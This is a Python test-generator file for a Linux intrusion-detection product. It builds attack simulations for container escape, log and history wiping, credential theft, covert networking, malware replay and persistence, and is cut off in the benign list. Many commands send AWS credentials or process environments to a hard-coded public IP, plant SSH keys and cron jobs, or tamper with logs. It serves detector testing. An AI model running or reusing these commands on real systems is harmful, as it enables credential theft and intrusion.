"""
CAT 5-14 — Remaining test generators.

Each generator returns a list of tests with the standard shape.
Bundled here for compactness; the runner imports gen_<NN>().

CAT 5  NS    — Container/namespace escape
CAT 6  AF    — Anti-forensics
CAT 7  KMOD  — Kernel BYOVD
CAT 8  CRED2 — Credential bypass paths
CAT 9  MEM2  — Memory implant evasion
CAT 10 NET   — Network covertness
CAT 11 REPLAY — Real-malware behavioral replay
CAT 12 RT    — Red-team multi-stage chains
CAT 13 FUZZ  — Detector fuzz / stress
CAT 14 BENIGN — Wide benign baselines (additional FP-control)
"""

C2 = "135.181.79.27"

# =========================================================
# CAT 5: Container/namespace escape
# =========================================================
def gen_ns():
    tests = []
    i = 0
    # unshare variants
    for ns_flag, ns_name in [("-r", "user"), ("-U", "user"), ("-n", "net"),
                              ("-p", "pid"), ("-u", "uts"), ("-i", "ipc"),
                              ("-m", "mount"), ("-C", "cgroup")]:
        for variant in range(3):
            i += 1
            tests.append({
                "id": f"NS-UNSHARE-{i:04d}", "category": "NS",
                "subcategory": "unshare", "malicious": True,
                "desc": f"unshare {ns_flag} ({ns_name}) v{variant}",
                "cmd": f"unshare {ns_flag} sh -c 'id' 2>/dev/null; true",
                "expect_rule": r"unshare", "detector": "ebpf.ns",
                "window": 5,
            })
    # nsenter into pid 1
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"NS-NSENTER-{i:04d}", "category": "NS",
            "subcategory": "nsenter_pid1", "malicious": True,
            "desc": f"nsenter -t 1 v{variant}",
            "cmd": f"nsenter -t 1 -m sh -c 'true' 2>/dev/null; true",
            "expect_rule": r"unshare|setns|container_escape",
            "detector": "ebpf.ns", "window": 5,
        })
    # Docker socket abuse
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"NS-DSOCK-{i:04d}", "category": "NS",
            "subcategory": "docker_socket", "malicious": True,
            "desc": f"curl docker socket /containers/json v{variant}",
            "cmd": "curl --max-time 2 --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -c 100 >/dev/null; true",
            "expect_rule": r"docker_socket_access|container_escape",
            "detector": "fim", "window": 5,
        })
    # Privileged-container shape: writing to a path inside a container-id-like name
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"NS-PRIVCT-{i:04d}", "category": "NS",
            "subcategory": "priv_container_pattern", "malicious": True,
            "desc": f"cgroup-cap probe v{variant}",
            "cmd": "cat /proc/self/status | grep -i ^Cap >/dev/null 2>&1; true",
            "expect_rule": r"container_escape_privileged",
            "detector": "rules.proc", "window": 5,
        })
    # pivot_root attempts
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"NS-PIVROOT-{i:04d}", "category": "NS",
            "subcategory": "pivot_root", "malicious": True,
            "desc": f"pivot_root attempt v{variant}",
            "cmd": f"unshare -m sh -c 'mkdir -p /tmp/nr-{variant}; mount --bind /tmp /tmp/nr-{variant} 2>/dev/null; pivot_root /tmp/nr-{variant} /tmp/nr-{variant} 2>/dev/null' 2>/dev/null; rm -rf /tmp/nr-{variant}; true",
            "expect_rule": r"pivot_root|container_escape",
            "detector": "ebpf.ns", "window": 6,
        })
    # Benign
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"NS-B-{i:04d}", "category": "NS",
            "subcategory": "benign_unshare_user", "malicious": False,
            "desc": f"benign: rootless unshare -r v{variant}",
            "cmd": "unshare -r --user --map-root-user echo ok >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 6: Anti-forensics
# =========================================================
def gen_af():
    tests = []
    i = 0
    # logrotate race / log truncation
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"AF-LOGTRUNC-{i:04d}", "category": "AF",
            "subcategory": "log_truncate", "malicious": True,
            "desc": f"truncate /var/log/auth.log v{variant}",
            "cmd": f"cp /var/log/auth.log /tmp/.al{variant} 2>/dev/null; >/var/log/auth.log; sleep 1; cp /tmp/.al{variant} /var/log/auth.log 2>/dev/null; rm -f /tmp/.al{variant}; true",
            "expect_rule": r"log_tamper|fim",
            "detector": "fim", "window": 8,
        })
    # mtime manipulation
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"AF-MTIME-{i:04d}", "category": "AF",
            "subcategory": "mtime_back", "malicious": True,
            "desc": f"touch -t backdate /tmp/.ev_{variant}",
            "cmd": f"touch /tmp/.ev_{variant}; touch -t 197001010000 /tmp/.ev_{variant}; rm -f /tmp/.ev_{variant}; true",
            "expect_rule": r"timestomp",
            "detector": "fim", "window": 5,
        })
    # shell history clear
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"AF-HISTORY-{i:04d}", "category": "AF",
            "subcategory": "shell_history_clear", "malicious": True,
            "desc": f"history -c + remove .bash_history v{variant}",
            "cmd": f"cp /root/.bash_history /tmp/.bh{variant} 2>/dev/null; >/root/.bash_history; sleep 1; cp /tmp/.bh{variant} /root/.bash_history 2>/dev/null; rm -f /tmp/.bh{variant}; true",
            "expect_rule": r"shell_rc_modified|bash_history",
            "detector": "fim", "window": 6,
        })
    # xhelix log tampering
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"AF-XHTAMP-{i:04d}", "category": "AF",
            "subcategory": "xhelix_log_tamper", "malicious": True,
            "desc": f"attempt to write to xhelix alerts.jsonl v{variant}",
            "cmd": f"echo '{{\"injected\":\"line\"}}' >> /var/log/xhelix/alerts.jsonl 2>/dev/null; sed -i 's/.*//1' /var/log/xhelix/alerts.jsonl 2>/dev/null; true",
            "expect_rule": r"selfprotect|tamper|integrity",
            "detector": "fim", "window": 6,
        })
    # chain mirror tamper attempt
    for variant in range(6):
        i += 1
        tests.append({
            "id": f"AF-CHAIN-{i:04d}", "category": "AF",
            "subcategory": "chain_tamper", "malicious": True,
            "desc": f"write to /var/lib/xhelix/chain v{variant}",
            "cmd": "echo evil >> /var/lib/xhelix/chain/batch.000 2>/dev/null; true",
            "expect_rule": r"chain_tamper|selfprotect|fim",
            "detector": "fim", "window": 5,
        })
    # /proc hidepid bypass attempt
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"AF-PROCHIDE-{i:04d}", "category": "AF",
            "subcategory": "proc_hidepid_bypass", "malicious": True,
            "desc": f"read /proc/sys/kernel/yama+pid_max v{variant}",
            "cmd": "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null >/dev/null; cat /proc/sys/kernel/pid_max 2>/dev/null >/dev/null; true",
            "expect_rule": r"sysctl_drift|kernel_inspect",
            "detector": "rules.proc", "window": 5,
        })
    # Benign
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"AF-B-{i:04d}", "category": "AF",
            "subcategory": "benign_log_read", "malicious": False,
            "desc": f"benign: tail /var/log/auth.log v{variant}",
            "cmd": "tail -1 /var/log/auth.log >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 7: Kernel BYOVD
# =========================================================
def gen_kmod():
    tests = []
    i = 0
    # init_module syscall attempts
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"KMOD-INITMOD-{i:04d}", "category": "KMOD",
            "subcategory": "init_module_syscall", "malicious": True,
            "desc": f"init_module syscall v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"buf=b\"\\x00\"*{64 + variant*16}; "
                f"libc.syscall(175, buf, len(buf), b\"\")' 2>/dev/null; true"
            ),
            "expect_rule": r"kernel_module_load|kernel_module_dropped",
            "detector": "ebpf.module", "window": 6,
        })
    # finit_module from held fd
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"KMOD-FINITMOD-{i:04d}", "category": "KMOD",
            "subcategory": "finit_module", "malicious": True,
            "desc": f"finit_module syscall v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes, os; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"fd=os.open(\"/dev/null\", os.O_RDONLY); "
                f"libc.syscall(313, fd, b\"\", 0); os.close(fd)' 2>/dev/null; true"
            ),
            "expect_rule": r"kernel_module_load",
            "detector": "ebpf.module", "window": 6,
        })
    # kexec attempts
    for variant in range(6):
        i += 1
        tests.append({
            "id": f"KMOD-KEXEC-{i:04d}", "category": "KMOD",
            "subcategory": "kexec_attempt", "malicious": True,
            "desc": f"kexec_load syscall attempt v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.syscall(246, 0, 0, 0, 0)' 2>/dev/null; true"
            ),
            "expect_rule": r"kexec|kernel",
            "detector": "ebpf.module", "window": 5,
        })
    # bpf() syscall variants (BPFdoor pattern)
    for variant in range(15):
        i += 1
        cmd_n = variant % 5  # BPF_MAP_CREATE/PROG_LOAD/etc
        tests.append({
            "id": f"KMOD-BPF-{i:04d}", "category": "KMOD",
            "subcategory": "bpf_syscall", "malicious": True,
            "desc": f"bpf() cmd={cmd_n} v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.syscall(321, {cmd_n}, 0, 0)' 2>/dev/null; true"
            ),
            "expect_rule": r"bpf_syscall_unexpected",
            "detector": "ebpf.self", "window": 5,
        })
    # kallsyms read
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"KMOD-KSYM-{i:04d}", "category": "KMOD",
            "subcategory": "kallsyms_read", "malicious": True,
            "desc": f"read /proc/kallsyms v{variant}",
            "cmd": "head -c 1024 /proc/kallsyms >/dev/null 2>&1; true",
            "expect_rule": r"kallsyms|kernel_inspect|cred_proc_scrape",
            "detector": "procscrape", "window": 5,
        })
    # Benign
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"KMOD-B-{i:04d}", "category": "KMOD",
            "subcategory": "benign_lsmod", "malicious": False,
            "desc": f"benign: lsmod v{variant}",
            "cmd": "lsmod | head -5 >/dev/null; true",
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 8: Credential bypass paths
# =========================================================
def gen_cred2():
    tests = []
    i = 0
    # mmap-read of credentials
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"CRED2-MMAP-{i:04d}", "category": "CRED2",
            "subcategory": "mmap_read", "malicious": True,
            "desc": f"mmap+read /root/.aws/credentials v{variant}",
            "cmd": (
                f"python3 -c 'import mmap, os; "
                f"fd=os.open(\"/root/.aws/credentials\", os.O_RDONLY); "
                f"m=mmap.mmap(fd, 0, prot=mmap.PROT_READ); "
                f"d=m[:64]; m.close(); os.close(fd)' 2>/dev/null; true"
            ),
            "expect_rule": r"credbroker.plaintext_read|cred",
            "detector": "credbroker", "window": 6,
        })
    # sendfile to socket
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"CRED2-SF-{i:04d}", "category": "CRED2",
            "subcategory": "sendfile", "malicious": True,
            "desc": f"sendfile creds → socket v{variant}",
            "cmd": (
                f"python3 -c 'import os, socket; "
                f"s=socket.socket(); s.connect((\"{C2}\", 14400)); "
                f"fd=os.open(\"/root/.aws/credentials\", os.O_RDONLY); "
                f"os.sendfile(s.fileno(), fd, 0, 128); "
                f"os.close(fd); s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"credbroker|exfil",
            "detector": "credbroker", "window": 6,
        })
    # copy_file_range
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"CRED2-CFR-{i:04d}", "category": "CRED2",
            "subcategory": "copy_file_range", "malicious": True,
            "desc": f"copy_file_range creds → /tmp v{variant}",
            "cmd": (
                f"python3 -c 'import os, ctypes; "
                f"libc=ctypes.CDLL(\"libc.so.6\"); "
                f"sfd=os.open(\"/root/.aws/credentials\", os.O_RDONLY); "
                f"dfd=os.open(\"/tmp/.cfr_{variant}\", os.O_WRONLY|os.O_CREAT, 0o644); "
                f"libc.syscall(326, sfd, 0, dfd, 0, 128, 0); "
                f"os.close(sfd); os.close(dfd)' 2>/dev/null; rm -f /tmp/.cfr_{variant}; true"
            ),
            "expect_rule": r"credbroker|cred",
            "detector": "credbroker", "window": 6,
        })
    # hardlink + read
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"CRED2-HLINK-{i:04d}", "category": "CRED2",
            "subcategory": "hardlink_bypass", "malicious": True,
            "desc": f"hardlink creds, read via link v{variant}",
            "cmd": f"ln /root/.aws/credentials /tmp/.hl_{variant} 2>/dev/null; cat /tmp/.hl_{variant} >/dev/null 2>&1; rm -f /tmp/.hl_{variant}; true",
            "expect_rule": r"credbroker|cred|fim",
            "detector": "credbroker", "window": 6,
        })
    # FD inheritance bypass
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"CRED2-FDINH-{i:04d}", "category": "CRED2",
            "subcategory": "fd_inheritance", "malicious": True,
            "desc": f"cat opens, sh inherits fd reads v{variant}",
            "cmd": f"cat /root/.aws/credentials >&3 3>/dev/null 2>/dev/null; (exec 3</root/.aws/credentials; sh -c 'head -c 50 <&3') 2>/dev/null; true",
            "expect_rule": r"credbroker.plaintext_read",
            "detector": "credbroker", "window": 6,
        })
    # Read via different file descriptors
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"CRED2-FDREAD-{i:04d}", "category": "CRED2",
            "subcategory": "fd_read_variant", "malicious": True,
            "desc": f"exec FD then read v{variant}",
            "cmd": f"(exec 7</root/.aws/credentials; head -c 30 <&7) >/dev/null 2>&1; true",
            "expect_rule": r"credbroker.plaintext_read",
            "detector": "credbroker", "window": 6,
        })
    # Benign
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"CRED2-B-{i:04d}", "category": "CRED2",
            "subcategory": "benign_cat_hostname", "malicious": False,
            "desc": f"benign: cat /etc/hostname v{variant}",
            "cmd": "cat /etc/hostname >/dev/null; true",
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 9: Memory implant evasion
# =========================================================
def gen_mem2():
    tests = []
    i = 0
    # Direct mmap(PROT_EXEC, MAP_ANON) — known eBPF gap
    for variant in range(15):
        i += 1
        size = 4096 + variant * 1024
        tests.append({
            "id": f"MEM2-MMAPRWX-{i:04d}", "category": "MEM2",
            "subcategory": "mmap_direct_rwx", "malicious": True,
            "desc": f"mmap direct RWX ({size}B) v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.mmap.restype=ctypes.c_void_p; "
                f"libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; "
                f"addr=libc.mmap(None, {size}, 7, 0x22, -1, 0); "
                f"print(hex(addr))' 2>/dev/null; true"
            ),
            "expect_rule": r"mem_mprotect_rwx|mmap_rwx",
            "detector": "ebpf.memory", "window": 6,
        })
    # vmsplice patterns
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"MEM2-VMSPLICE-{i:04d}", "category": "MEM2",
            "subcategory": "vmsplice", "malicious": True,
            "desc": f"vmsplice probe v{variant}",
            "cmd": (
                f"python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"r,w=os.pipe(); libc.syscall(278, w, 0, 1, 0); os.close(r); os.close(w)' 2>/dev/null; true"
            ),
            "expect_rule": r"vmsplice|kernel",
            "detector": "ebpf.proc", "window": 5,
        })
    # io_uring SQE setup
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"MEM2-IOURING-{i:04d}", "category": "MEM2",
            "subcategory": "io_uring", "malicious": True,
            "desc": f"io_uring_setup probe v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"params=ctypes.create_string_buffer(120); "
                f"libc.syscall(425, 8, params)' 2>/dev/null; true"
            ),
            "expect_rule": r"io_uring|kernel",
            "detector": "ebpf.proc", "window": 5,
        })
    # Memfd RWX patterns (already tested in CAT1 but with variants)
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"MEM2-MEMFD-{i:04d}", "category": "MEM2",
            "subcategory": "memfd_rwx", "malicious": True,
            "desc": f"memfd_create + mmap RWX v{variant}",
            "cmd": (
                f"python3 -c 'import os, ctypes, mmap; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"fd=libc.memfd_create(b\"m{variant}\", 0); "
                f"os.write(fd, b\"\\x90\"*4096); "
                f"libc.mmap.restype=ctypes.c_void_p; "
                f"libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; "
                f"libc.mmap(None, 4096, 7, 0x02, fd, 0); os.close(fd)' 2>/dev/null; true"
            ),
            "expect_rule": r"memfd|mem_mprotect|memfd_run_pattern",
            "detector": "ebpf.memory", "window": 6,
        })
    # USDT/uprobe abuse
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"MEM2-USDT-{i:04d}", "category": "MEM2",
            "subcategory": "uprobe_abuse", "malicious": True,
            "desc": f"perf_event_open uprobe attach v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.syscall(298, 0, -1, -1, -1, 0)' 2>/dev/null; true"
            ),
            "expect_rule": r"bpf_syscall|kernel",
            "detector": "ebpf.self", "window": 5,
        })
    # Benign
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"MEM2-B-{i:04d}", "category": "MEM2",
            "subcategory": "benign_mmap_rw", "malicious": False,
            "desc": f"benign: mmap RW (no exec) v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.mmap.restype=ctypes.c_void_p; "
                f"libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; "
                f"libc.mmap(None, 4096, 3, 0x22, -1, 0)' 2>/dev/null; true"
            ),
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 10: Network covertness
# =========================================================
def gen_net():
    tests = []
    i = 0
    # ICMP-tunnel patterns
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"NET-ICMP-{i:04d}", "category": "NET",
            "subcategory": "icmp_tunnel", "malicious": True,
            "desc": f"raw ICMP send to attacker v{variant}",
            "cmd": (
                f"python3 -c 'import socket, os, struct; "
                f"s=socket.socket(socket.AF_INET, socket.SOCK_RAW, 1); "
                f"icmp=struct.pack(\"!BBHHH\", 8, 0, 0, os.getpid()&0xffff, {variant}); "
                f"s.sendto(icmp, (\"{C2}\", 0)); s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"raw_socket|net_icmp",
            "detector": "ebpf.net", "window": 5,
        })
    # IP_HDRINCL raw IP send
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"NET-RAWIP-{i:04d}", "category": "NET",
            "subcategory": "raw_ip_hdrincl", "malicious": True,
            "desc": f"raw IP socket IP_HDRINCL v{variant}",
            "cmd": (
                f"python3 -c 'import socket; "
                f"s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW); "
                f"s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1); s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"raw_socket",
            "detector": "ebpf.net", "window": 5,
        })
    # TCP socket with unusual options (TCP_NODELAY, IP_TOS for evasion)
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"NET-TCPOPTS-{i:04d}", "category": "NET",
            "subcategory": "tcp_evasive_opts", "malicious": True,
            "desc": f"TCP with unusual sockopts v{variant}",
            "cmd": (
                f"python3 -c 'import socket; "
                f"s=socket.socket(); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); "
                f"s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0xb8); "
                f"s.connect((\"{C2}\", 14400)); s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r".",  # any net rule
            "detector": "ebpf.net", "window": 5,
        })
    # AF_PACKET raw socket (BPFdoor signature)
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"NET-AFPKT-{i:04d}", "category": "NET",
            "subcategory": "af_packet_raw", "malicious": True,
            "desc": f"AF_PACKET SOCK_RAW v{variant}",
            "cmd": (
                f"python3 -c 'import socket; "
                f"s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); "
                f"s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"raw_socket",
            "detector": "ebpf.net", "window": 5,
        })
    # ARP-ish packet send via raw socket
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"NET-ARP-{i:04d}", "category": "NET",
            "subcategory": "arp_pattern", "malicious": True,
            "desc": f"AF_PACKET ARP probe v{variant}",
            "cmd": (
                f"python3 -c 'import socket; "
                f"s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806)); "
                f"s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"raw_socket",
            "detector": "ebpf.net", "window": 5,
        })
    # Outbound to known bad-ish IP (loopback used for portability)
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"NET-BAD-{i:04d}", "category": "NET",
            "subcategory": "outbound_known_bad", "malicious": True,
            "desc": f"outbound to attacker IP v{variant}",
            "cmd": f"timeout 2 curl -s http://{C2}:14400/{variant} >/dev/null 2>&1; true",
            "expect_rule": r"outbound_to_known_bad|threat_intel",
            "detector": "ebpf.net", "window": 5,
        })
    # Benign
    for variant in range(7):
        i += 1
        tests.append({
            "id": f"NET-B-{i:04d}", "category": "NET",
            "subcategory": "benign_https_legit", "malicious": False,
            "desc": f"benign: HTTPS to 1.1.1.1 v{variant}",
            "cmd": "timeout 3 curl -sk https://1.1.1.1/ >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)", "detector": "control", "window": 4,
        })
    return tests


# =========================================================
# CAT 11: Real-malware behavioral replay
# =========================================================
def gen_replay():
    tests = []
    i = 0
    # BPFdoor-class chain
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"REPLAY-BPFDOOR-{i:04d}", "category": "REPLAY",
            "subcategory": "bpfdoor_chain", "malicious": True,
            "desc": f"BPFdoor sig chain: raw_socket + bpf() + sleep v{variant}",
            "cmd": (
                f"python3 -c 'import socket, ctypes; "
                f"s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); "
                f"libc=ctypes.CDLL(\"libc.so.6\"); libc.syscall(321, 1, 0, 0); "
                f"s.close()' 2>/dev/null; true"
            ),
            "expect_rule": r"raw_socket|bpf_syscall|takeover",
            "detector": "ebpf.self", "window": 6,
        })
    # Cobalt-Strike beacon shape
    for variant in range(12):
        i += 1
        tests.append({
            "id": f"REPLAY-CS-{i:04d}", "category": "REPLAY",
            "subcategory": "cobalt_strike_shape", "malicious": True,
            "desc": f"CS beacon: RWX + jittered callback v{variant}",
            "cmd": (
                f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"libc.mmap.restype=ctypes.c_void_p; "
                f"libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; "
                f"a=libc.mmap(None,4096,3,0x22,-1,0); "
                f"libc.mprotect(ctypes.c_void_p(a), 4096, 7)' 2>/dev/null; "
                f"for n in 1 2 3 4 5; do timeout 1 curl -s http://{C2}:14400/cs-{variant}-$n >/dev/null 2>&1; sleep 5; done; true"
            ),
            "expect_rule": r"mem_mprotect_rwx|beacon",
            "detector": "ebpf.memory", "window": 40,
        })
    # Lazarus RemotePE chain (DPAPI-equivalent → loader → in-memory)
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"REPLAY-LAZARUS-{i:04d}", "category": "REPLAY",
            "subcategory": "lazarus_remotepe", "malicious": True,
            "desc": f"Lazarus-class memfd + reflective load v{variant}",
            "cmd": (
                f"python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"fd=libc.memfd_create(b\"ld{variant}\", 0); "
                f"with open(\"/lib/x86_64-linux-gnu/libm.so.6\", \"rb\") as f: os.write(fd, f.read()); "
                f"libdl=ctypes.CDLL(\"libdl.so.2\"); libdl.dlopen.restype=ctypes.c_void_p; "
                f"libdl.dlopen(f\"/proc/self/fd/{{fd}}\".encode(), 2)' 2>/dev/null; true"
            ),
            "expect_rule": r"memfd|dlopen|from_memfd",
            "detector": "ebpf.proc", "window": 6,
        })
    # Megalodon-class harvester
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"REPLAY-MEGA-{i:04d}", "category": "REPLAY",
            "subcategory": "megalodon_harvest", "malicious": True,
            "desc": f"Megalodon: /proc/*/environ scrape + exfil v{variant}",
            "cmd": (
                f"for p in $(ls /proc/ | grep -E '^[0-9]+$' | head -20); do head -c 100 /proc/$p/environ 2>/dev/null; done | "
                f"timeout 2 curl -s -X POST --data-binary @- http://{C2}:14400/mega-{variant} >/dev/null 2>&1; true"
            ),
            "expect_rule": r"cred_proc_scrape|exfil",
            "detector": "procscrape", "window": 6,
        })
    return tests


# =========================================================
# CAT 12: Red-team multi-stage chains
# =========================================================
def gen_rt():
    tests = []
    i = 0
    # Full chain: web-rce → /tmp dropper → cred read → exfil
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"RT-FULL-{i:04d}", "category": "RT",
            "subcategory": "web_rce_full_chain", "malicious": True,
            "desc": f"Full chain: php-fpm → /tmp dropper → exfil v{variant}",
            "cmd": (
                f"cp /bin/sh /tmp/.fpm{variant}; "
                f"/tmp/.fpm{variant} -c 'cat /root/.aws/credentials | curl -s -X POST --data-binary @- http://{C2}:14400/chain-{variant} >/dev/null 2>&1' 2>/dev/null; "
                f"rm -f /tmp/.fpm{variant}; true"
            ),
            "expect_rule": r"binary_runs_from_tmp|credbroker|web_server_spawns",
            "detector": "rules.proc", "window": 8,
        })
    # Persistence chain
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"RT-PERSIST-{i:04d}", "category": "RT",
            "subcategory": "persist_chain", "malicious": True,
            "desc": f"Persistence chain: cron + bashrc + ssh-key v{variant}",
            "cmd": (
                f"echo '* * * * * root /tmp/p' > /etc/cron.d/rt-{variant}; "
                f"mkdir -p /root/.ssh; cp /root/.ssh/authorized_keys /tmp/.ak{variant} 2>/dev/null; "
                f"echo 'ssh-rsa AAAATESTXFA{variant} attacker' >> /root/.ssh/authorized_keys; "
                f"sleep 2; "
                f"rm -f /etc/cron.d/rt-{variant}; cp /tmp/.ak{variant} /root/.ssh/authorized_keys 2>/dev/null; rm -f /tmp/.ak{variant}; true"
            ),
            "expect_rule": r"cron_new_unit|ssh_key_added",
            "detector": "fim", "window": 12,
        })
    # Memory loader chain
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"RT-MEMLDR-{i:04d}", "category": "RT",
            "subcategory": "memory_loader_chain", "malicious": True,
            "desc": f"Memory loader: memfd + mprotect_rwx + sleep v{variant}",
            "cmd": (
                f"python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); "
                f"fd=libc.memfd_create(b\"l{variant}\", 0); "
                f"os.write(fd, b\"shellcode\"*512); "
                f"libc.mmap.restype=ctypes.c_void_p; "
                f"libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; "
                f"addr=libc.mmap(None, 4096, 3, 0x22, -1, 0); "
                f"libc.mprotect(ctypes.c_void_p(addr), 4096, 7); "
                f"os.close(fd)' 2>/dev/null; true"
            ),
            "expect_rule": r"mem_mprotect_rwx|memfd",
            "detector": "ebpf.memory", "window": 6,
        })
    return tests


# =========================================================
# CAT 13: Detector fuzz / stress
# =========================================================
def gen_fuzz():
    tests = []
    i = 0
    # High-rate spawn (fork bomb shape)
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"FUZZ-FORK-{i:04d}", "category": "FUZZ",
            "subcategory": "spawn_burst", "malicious": True,
            "desc": f"100-spawn burst v{variant}",
            "cmd": f"for n in $(seq 1 100); do /bin/true; done; true",
            "expect_rule": r"process_spawn_burst|spawn",
            "detector": "ebpf.proc", "window": 6,
        })
    # High-rate openat
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"FUZZ-OPEN-{i:04d}", "category": "FUZZ",
            "subcategory": "openat_burst", "malicious": True,
            "desc": f"500-openat burst v{variant}",
            "cmd": "for n in $(seq 1 500); do head -c 1 /etc/hostname >/dev/null; done; true",
            "expect_rule": r"file_read_burst|burst",
            "detector": "ebpf.file", "window": 5,
        })
    # High-rate net_connect
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"FUZZ-CONN-{i:04d}", "category": "FUZZ",
            "subcategory": "connect_burst", "malicious": True,
            "desc": f"30-connect burst v{variant}",
            "cmd": f"for n in $(seq 1 30); do timeout 1 nc -w 1 -z {C2} 14400 2>/dev/null; done; true",
            "expect_rule": r"net_burst|outbound",
            "detector": "ebpf.net", "window": 6,
        })
    # Malformed argv
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"FUZZ-MALARGV-{i:04d}", "category": "FUZZ",
            "subcategory": "malformed_argv", "malicious": True,
            "desc": f"binary with extremely long argv v{variant}",
            "cmd": f"/bin/true $(yes x | head -c 8000) 2>/dev/null; true",
            "expect_rule": r"argv|web_server_spawns",
            "detector": "ebpf.proc", "window": 5,
        })
    return tests


# =========================================================
# CAT 14: Wider benign baseline
# =========================================================
def gen_benign():
    tests = []
    i = 0
    benign_cmds = [
        ("ls_home", "ls -la /root >/dev/null"),
        ("cat_hostname", "cat /etc/hostname >/dev/null"),
        ("df_h", "df -h >/dev/null"),
        ("free_m", "free -m >/dev/null"),
        ("uptime", "uptime >/dev/null"),
        ("date", "date >/dev/null"),
        ("uname_a", "uname -a >/dev/null"),
        ("id", "id >/dev/null"),
